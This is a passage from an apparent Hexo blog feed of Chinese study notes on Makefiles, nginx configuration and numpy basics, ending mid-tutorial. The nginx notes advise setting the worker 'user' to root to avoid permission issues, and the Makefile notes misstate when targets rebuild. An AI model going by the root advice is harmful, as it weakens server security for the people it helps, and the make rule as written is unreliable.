<p>生成 <code>dist/</code> 目录，是项目编译后的静态文件</p>
]]></content>
      <categories>
        <category>不知道怎么分类的分类</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>makefile入门</title>
    <url>/makefile%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h3><p><code>makefile</code>工程管理文件，与<code>make</code>命令结合，在linux上用于管理大规模工程。</p>
<p>以下记录简单使用<code>make</code>的学习笔记。</p>
<span id="more"></span>

<h3 id="1-makefile文件编写规则"><a href="#1-makefile文件编写规则" class="headerlink" title="1. makefile文件编写规则"></a>1. makefile文件编写规则</h3><p><code>makefile</code>文件也可命名为<code>Makefile</code>文件。</p>
<p><code>makefile</code>文件一般格式为：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">目标文件名: &lt;依赖文件列表&gt;</span></span><br><span class="line">    用于生成目标文件的命令序列   <span class="comment"># 注意开头的tab, 而不是空格</span></span><br></pre></td></tr></table></figure>

<p>如：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">hello1: hello1.c</span></span><br><span class="line">    gcc -o hello1 -g hello1.c</span><br></pre></td></tr></table></figure>

<p><code>hello1</code>是要生成的文件，即目标文件。<code>hello1.c</code>是生成目标文件的依赖文件，依赖文件可以有任意个。<code>gcc -o hello1 -g hello1.c</code> 是生成该文件要运行的<code>shell</code>命令。可以有多条运行命令，若要换行，在上一条命令后加上换行符<code>\</code>。</p>
<h3 id="2-makefile运行规则"><a href="#2-makefile运行规则" class="headerlink" title="2. makefile运行规则"></a>2. makefile运行规则</h3><p>在命令行中输入：<code>$ make</code>，运行makefile文件：</p>
<ul>
<li>make命令先会找到<code>makefile</code>中<strong>第一行的目标文件</strong>。如果<strong>目标文件已存在</strong>，或者<strong>依赖文件更新</strong>，那么就会执行该项中的命令。</li>
<li>如果依赖文件不存在，那<code>make</code>会做相应提示。</li>
<li>但是，如果依赖文件是另一项的目标文件，那<code>make</code>会找到该项，并重复上述步骤。</li>
</ul>
<h3 id="3-示例"><a href="#3-示例" class="headerlink" title="3. 示例"></a>3. 示例</h3><p>有一个完整的Makefile文件，内容如下：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">init.py: hello1 hello2</span></span><br><span class="line">  python init.py</span><br><span class="line"></span><br><span class="line"><span class="section">hello1: hello1.c</span></span><br><span class="line">  gcc -o hello1 -g hello1.c</span><br><span class="line"></span><br><span class="line"><span class="section">hello2: hello2.c</span></span><br><span class="line">  gcc -o hello2 -g hello2.c</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">  rm hello1 hello2</span><br></pre></td></tr></table></figure>

<p><code>init.py</code> 目标文件的依赖文件是 <code>hello1</code> 和 <code>hello2</code>。同时，<code>hello1</code>是另一项的目标文件，该项的依赖文件是<code>hello1.c</code>；<code>hello2</code>也是另一项的目标文件，依赖文件是<code>hello2.c</code>。</p>
<p>命令行执行<code>make</code>命令后：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make</span><br><span class="line">gcc -o hello1 -g hello1.c</span><br><span class="line">gcc -o hello2 -g hello2.c</span><br><span class="line">python init.py</span><br></pre></td></tr></table></figure>

<p>显示执行了相应项的<code>shell</code>命令。由于，hello1和hello2文件不存在，得先执行以这些文件为目标文件的，对应项的命令。等第一项的依赖文件都生成了，才会执行第一项的命令。</p>
<h3 id="4-执行特定指令"><a href="#4-执行特定指令" class="headerlink" title="4. 执行特定指令"></a>4. 执行特定指令</h3><p>在该示例中，还有一项的目标文件为<code>clean</code>。这并不是一个要生成的目标文件，而是一个清除<code>hello1</code>和<code>hello2</code>执行文件的指令，这是一个<strong>伪目标</strong>。</p>
<p>我们想执行这条指令时，命令行输入：<code>$ make clean</code>即可。</p>
<p>其实，我们也可以通过 <code>$ make hello1</code> 来单独<code>make</code>这一项。</p>
]]></content>
      <categories>
        <category>不知道怎么分类的分类</category>
      </categories>
      <tags>
        <tag>Makefile</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx相关笔记</title>
    <url>/nginx%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>关于nginx相关操作的笔记</p>
<span id="more"></span>

<h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><p>许多博客上提供的安装方法特别复杂，不知为何。</p>
<p>在<code>centos</code>上，我一般都是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install nginx</span><br></pre></td></tr></table></figure>

<p>(注意，centos上许多工具都依托于python2，如果命令python指向了python3，则在使用大多数命令时会报错)</p>
<h2 id="2-nginx相关命令"><a href="#2-nginx相关命令" class="headerlink" title="2. nginx相关命令"></a>2. nginx相关命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nginx -h</span><br><span class="line">nginx version: nginx/1.12.2</span><br><span class="line">Usage: nginx [-?hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -?,-h         : this <span class="built_in">help</span></span><br><span class="line">  -v            : show version and <span class="built_in">exit</span></span><br><span class="line">  -V            : show version and configure options <span class="keyword">then</span> <span class="built_in">exit</span></span><br><span class="line">  -t            : <span class="built_in">test</span> configuration and <span class="built_in">exit</span></span><br><span class="line">  -T            : <span class="built_in">test</span> configuration, dump it and <span class="built_in">exit</span></span><br><span class="line">  -q            : suppress non-error messages during configuration testing</span><br><span class="line">  -s signal     : send signal to a master process: stop, quit, reopen, reload</span><br><span class="line">  -p prefix     : <span class="built_in">set</span> prefix path (default: /usr/share/nginx/)</span><br><span class="line">  -c filename   : <span class="built_in">set</span> configuration file (default: /etc/nginx/nginx.conf)</span><br><span class="line">  -g directives : <span class="built_in">set</span> global directives out of configuration file</span><br></pre></td></tr></table></figure>

<p>常用的有：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -s stop <span class="comment"># 停止nginx</span></span><br><span class="line">nginx -s reload <span class="comment"># 重启</span></span><br><span class="line">nginx -c filename <span class="comment"># 以filename为配置文件启动，默认的配置文件在 /etc/nginx/nginx.conf</span></span><br></pre></td></tr></table></figure>

<h2 id="3-修改nginx所属用户"><a href="#3-修改nginx所属用户" class="headerlink" title="3. 修改nginx所属用户"></a>3. 修改nginx所属用户</h2><p><code>nginx.conf</code>配置文件的根属性<code>user</code>修改为<code>root</code></p>
<p>防止出现权限问题</p>
<h2 id="4-开启一个http服务器"><a href="#4-开启一个http服务器" class="headerlink" title="4. 开启一个http服务器"></a>4. 开启一个http服务器</h2><p>在根属性<code>http&#123;&#125;</code>中添加：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">8001</span>; <span class="comment"># 监听的端口</span></span><br><span class="line">    <span class="attribute">server_name</span>  tiger; <span class="comment"># 服务器名字</span></span><br><span class="line">    <span class="attribute">root</span>         /home/test/tiger/; <span class="comment"># 允许访问的静态文件存放路径</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Load configuration files for the default server block.</span></span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/default.d/<span class="regexp">*.conf</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 默认访问文件</span></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">index</span> index.html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">404</span> /<span class="number">404</span>.html;</span><br><span class="line">        <span class="section">location</span> = /40x.html &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span> /50x.html;</span><br><span class="line">        <span class="section">location</span> = /50x.html &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置完，通过<code>nginx -s reload</code>或者<code>nginx -c &lt;filename&gt;</code>启动。</p>
<p>然后，就可以通过<code>服务器ip地址:8001</code>或者<code>服务器域名:8001</code>访问了。</p>
<h2 id="5-反向代理-解决跨域问题"><a href="#5-反向代理-解决跨域问题" class="headerlink" title="5. 反向代理(解决跨域问题)"></a>5. 反向代理(解决跨域问题)</h2><p>所谓<strong>反向代理</strong>是指在<strong>服务器端</strong>进行设置代理：客户端访问的目标网站实际上是一个代理；</p>
<p>而<strong>正向代理</strong>则是指在<strong>客户端</strong>设置代理，客户以代理ip身份去访问目标网站。例如，先开代理，然后翻墙访问pxxxhup。</p>
<p>nginx设置反向代理，在<code>http&#123; server&#123;&#125;&#125;</code>中添加：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">8000</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  _; <span class="comment"># 匿名，没什么问题</span></span><br><span class="line">    <span class="attribute">root</span>         /home/test/myblog_Fontend/;</span><br><span class="line"></span><br><span class="line">    ....</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 所有访问 ip:8000/api 的请求，都将转到 http://0.0.0.0:8081，解决跨域问题的一剂良方</span></span><br><span class="line">    <span class="section">location</span> /api &#123;</span><br><span class="line">        <span class="attribute">include</span>  uwsgi_params;</span><br><span class="line">        <span class="attribute">proxy_pass</span>   http://0.0.0.0:8081;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-gzip压缩文件"><a href="#6-gzip压缩文件" class="headerlink" title="6. gzip压缩文件"></a>6. gzip压缩文件</h2><p>此方法可以提高网站访问速度</p>
<p>在<code>http&#123;&#125;</code>中添加：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启和关闭gzip模式</span></span><br><span class="line"><span class="attribute">gzip</span> <span class="literal">on</span>;</span><br><span class="line"><span class="comment">#gizp压缩起点，文件大于1k才进行压缩</span></span><br><span class="line"><span class="attribute">gzip_min_length</span> <span class="number">1k</span>;</span><br><span class="line"><span class="comment"># gzip 压缩级别，1-9，数字越大压缩的越好，也越占用CPU时间</span></span><br><span class="line"><span class="attribute">gzip_comp_level</span> <span class="number">6</span>;</span><br><span class="line"><span class="comment"># 进行压缩的文件类型。</span></span><br><span class="line"><span class="attribute">gzip_types</span> text/plain application/javascript application/x-javascript text/css application/xml text/javascript ;</span><br><span class="line"><span class="comment">#nginx对于静态文件的处理模块，开启后会寻找以.gz结尾的文件，直接返回，不会占用cpu进行压缩，如果找不到则不进行压缩</span></span><br><span class="line"><span class="attribute">gzip_static</span> <span class="literal">on</span>;</span><br><span class="line"><span class="comment"># 是否在http header中添加Vary: Accept-Encoding，建议开启</span></span><br><span class="line"><span class="attribute">gzip_vary</span> <span class="literal">off</span>;</span><br><span class="line"><span class="comment"># 设置gzip压缩针对的HTTP协议版本</span></span><br><span class="line"><span class="attribute">gzip_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>开发</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>后端</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>numpy学习笔记</title>
    <url>/numpy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>鉴于在卓越班暑期学习中，接触到机器学习的内容，索性深入研究一番，蹭一蹭机器学习的热度。</p>
<p>众所周知，学习机器学习之前，必须学习数据分析。而<code>numpy</code>则是数据分析的第一道关。</p>
<p><code>numpy</code>的官网中，如此介绍：</p>
<blockquote>
<p>NumPy是Python中科学计算的基础包。它是一个Python库，提供多维数组对象，各种派生对象（如掩码数组和矩阵），以及用于数组快速操作的各种API，有包括数学、逻辑、形状操作、排序、选择、输入输出、离散傅立叶变换、基本线性代数，基本统计运算和随机模拟等等。</p>
</blockquote>
<p>由此可见，<code>numpy</code>是一个以数组为基础，包含各种骚操作和数学运算的框架。</p>
<span id="more"></span>

<h2 id="1-对比"><a href="#1-对比" class="headerlink" title="1. 对比"></a>1. 对比</h2><p>俗话说，没有对比就没有伤害。<code>numpy</code>为何这么优秀呢？先让我们了解一下原生<code>python</code>的不足：</p>
<ul>
<li><p>无法用广播的方式操作数组，例如：</p>
  <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(l*<span class="number">2</span>) <span class="comment"># 输出: [1, 2, 3, 1, 2, 3]，而不是[2,4,6]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(l+l) <span class="comment"># 输出: [1, 2, 3, 1, 2, 3]，而不是[2,4,6]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x * <span class="number">2</span>, l))) <span class="comment"># 才输出: [2,4,6]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>无法快速生成一个数组，如：</p>
  <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>, <span class="number">2</span>)) <span class="comment"># 输出：range(1, 100, 2)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>, <span class="number">2</span>))) <span class="comment"># 才输出：[1,3...97,99]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>对于大量数据的相乘处理，速度很慢。</p>
</li>
<li><p>等等，详情见官网。</p>
</li>
</ul>
<p>为什么<code>numpy</code>运算速度很快呢，因为<code>numpy</code>底层采用预编译的<code>c</code>语言程序运行，比如数组相乘。</p>
<p>另外，<a href="https://www.numpy.org.cn/user/numpy_for_matlab_users.html">numpy与matlab对比</a>。</p>
<h2 id="2-入门"><a href="#2-入门" class="headerlink" title="2. 入门"></a>2. 入门</h2><p><code>numpy</code>数组的核心是<code>ndarray</code>对象。</p>
<h3 id="2-1-数组创建"><a href="#2-1-数组创建" class="headerlink" title="2.1. 数组创建"></a>2.1. 数组创建</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 依据数组进行创建</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动决定数据类型</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.dtype</span><br><span class="line">dtype(<span class="string">&#x27;int32&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建时指定数据类型</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.array( [ [<span class="number">1</span>,<span class="number">2</span>], [<span class="number">3</span>,<span class="number">4</span>] ], dtype=<span class="built_in">complex</span> )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[<span class="number">1.</span>+<span class="number">0.j</span>, <span class="number">2.</span>+<span class="number">0.j</span>],</span><br><span class="line">       [<span class="number">3.</span>+<span class="number">0.j</span>, <span class="number">4.</span>+<span class="number">0.j</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成全0数组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.zeros((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">       [<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全1数组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.ones((<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[[<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">        [<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">        [<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>]],</span><br><span class="line"></span><br><span class="line">       [[<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">        [<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">        [<span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>, <span class="number">1.</span>]]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成等差数组arange(start, stop, step)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.arange(<span class="number">10</span>,<span class="number">30</span>,<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([<span class="number">10</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">25</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.random.random((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[<span class="number">0.58929938</span>, <span class="number">0.54624629</span>, <span class="number">0.08792059</span>, <span class="number">0.76392006</span>],</span><br><span class="line">       [<span class="number">0.44203064</span>, <span class="number">0.12489059</span>, <span class="number">0.90234191</span>, <span class="number">0.43714071</span>],</span><br><span class="line">       [<span class="number">0.30633888</span>, <span class="number">0.71889312</span>, <span class="number">0.42413405</span>, <span class="number">0.66626242</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成服从标准正态分布的随机数。</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.random.randn(<span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([ <span class="number">0.70899314</span>, -<span class="number">0.80225292</span>, -<span class="number">1.03481739</span>,  <span class="number">0.23374236</span>,  <span class="number">1.37977021</span>,</span><br><span class="line">       -<span class="number">1.68141055</span>,  <span class="number">0.04312959</span>, -<span class="number">1.2086538</span> ,  <span class="number">0.83465968</span>, -<span class="number">0.24310517</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># numpy.random.normal(loc, scale, size), loc均值、scale标准差、size个数，生成普通正态分布。</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2-ndarray对象属性"><a href="#2-2-ndarray对象属性" class="headerlink" title="2.2. ndarray对象属性"></a>2.2. ndarray对象属性</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.arange(<span class="number">10</span>,<span class="number">30</span>,<span class="number">1</span>).reshape(<span class="number">2</span>,<span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>],</span><br><span class="line">       [<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 维度的个数，几维</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.ndim</span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 维度，如(2,10)代表2行10列</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.shape</span><br><span class="line">(<span class="number">2</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组元素个数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.size</span><br><span class="line"><span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 元素类型</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.dtype</span><br><span class="line">dtype(<span class="string">&#x27;int32&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="2-3-基础运算"><a href="#2-3-基础运算" class="headerlink" title="2.3. 基础运算"></a>2.3. 基础运算</h3><h4 id="2-3-1-简单运算"><a href="#2-3-1-简单运算" class="headerlink" title="2.3.1. 简单运算"></a>2.3.1. 简单运算</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.array( [<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">50</span>] )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = np.arange( <span class="number">4</span> )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([<span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 两个对象相减/相乘等，广播至数组的每一个元素</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a-b</span><br><span class="line">array([<span class="number">20</span>, <span class="number">29</span>, <span class="number">38</span>, <span class="number">47</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a*b</span><br><span class="line">array([  <span class="number">0</span>,  <span class="number">30</span>,  <span class="number">80</span>, <span class="number">150</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 单个对象运算，广播操作至数组的每一个元素</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b**<span class="number">2</span></span><br><span class="line">array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>], dtype=int32)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逻辑运算</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a&lt;<span class="number">35</span></span><br><span class="line">array([ <span class="literal">True</span>,  <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># +=, *= 等运算</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a += <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([<span class="number">23</span>, <span class="number">33</span>, <span class="number">43</span>, <span class="number">53</span>])</span><br></pre></td></tr></table></figure>

<h4 id="2-3-2-进阶数学运算"><a href="#2-3-2-进阶数学运算" class="headerlink" title="2.3.2. 进阶数学运算"></a>2.3.2. 进阶数学运算</h4><ul>
<li>求和、最大值、最小值</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.arange( <span class="number">4</span> )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有元素求和</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.<span class="built_in">sum</span>()</span><br><span class="line"><span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有元素最小值</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.<span class="built_in">min</span>()</span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有元素最大值</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.<span class="built_in">max</span>()</span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = np.arange(<span class="number">12</span>).reshape(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">       [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一维度/列 求和</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.<span class="built_in">sum</span>(axis=<span class="number">0</span>)</span><br><span class="line">array([<span class="number">12</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">21</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二维度/行 求最小值</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.<span class="built_in">min</span>(axis=<span class="number">1</span>)</span><br><span class="line">array([<span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = np.arange(<span class="number">12</span>).reshape(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">array([[[ <span class="number">0</span>,  <span class="number">1</span>],</span><br><span class="line">        [ <span class="number">2</span>,  <span class="number">3</span>]],</span><br><span class="line"></span><br><span class="line">       [[ <span class="number">4</span>,  <span class="number">5</span>],</span><br><span class="line">        [ <span class="number">6</span>,  <span class="number">7</span>]],</span><br><span class="line"></span><br><span class="line">       [[ <span class="number">8</span>,  <span class="number">9</span>],</span><br><span class="line">        [<span class="number">10</span>, <span class="number">11</span>]]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.<span class="built_in">sum</span>(axis=<span class="number">0</span>)</span><br><span class="line">array([[<span class="number">12</span>, <span class="number">15</span>],</span><br><span class="line">       [<span class="number">18</span>, <span class="number">21</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.<span class="built_in">sum</span>(axis=<span class="number">1</span>)</span><br><span class="line">array([[ <span class="number">2</span>,  <span class="number">4</span>],</span><br><span class="line">       [<span class="number">10</span>, <span class="number">12</span>],</span><br><span class="line">       [<span class="number">18</span>, <span class="number">20</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.<span class="built_in">sum</span>(axis=<span class="number">2</span>)</span><br><span class="line">array([[ <span class="number">1</span>,  <span class="number">5</span>],</span><br><span class="line">       [ <span class="number">9</span>, <span class="number">13</span>],</span><br><span class="line">       [<span class="number">17</span>, <span class="number">21</span>]])</span><br></pre></td></tr></table></figure>

<ul>
<li>矩阵运算</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>A = np.array( [[<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line"><span class="meta">... </span>            [<span class="number">0</span>,<span class="number">1</span>]] )</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>B = np.array( [[<span class="number">2</span>,<span class="number">0</span>],</span><br><span class="line"><span class="meta">... </span>            [<span class="number">3</span>,<span class="number">4</span>]] )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按元素运算</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A * B</span><br><span class="line">array([[<span class="number">2</span>, <span class="number">0</span>],</span><br><span class="line">       [<span class="number">0</span>, <span class="number">4</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># dot() 矩阵运算，区别于按元素运算</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A.dot(B)</span><br><span class="line">array([[<span class="number">5</span>, <span class="number">4</span>],</span><br><span class="line">       [<span class="number">3</span>, <span class="number">4</span>]])</span><br></pre></td></tr></table></figure>

<ul>
<li>正弦、余弦、e^x、均值、标准差、开根</li>
</ul>
